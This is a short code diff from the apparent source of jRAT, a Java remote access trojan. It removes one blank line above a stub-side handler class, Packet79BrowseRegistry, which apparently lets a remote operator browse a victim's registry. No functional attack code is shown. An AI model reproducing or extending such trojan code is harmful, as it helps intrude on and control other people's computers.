@@ -7,7 +7,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet54Registry;
 
-
 public class Packet79BrowseRegistry extends AbstractIncomingPacket {
 
 	@Override
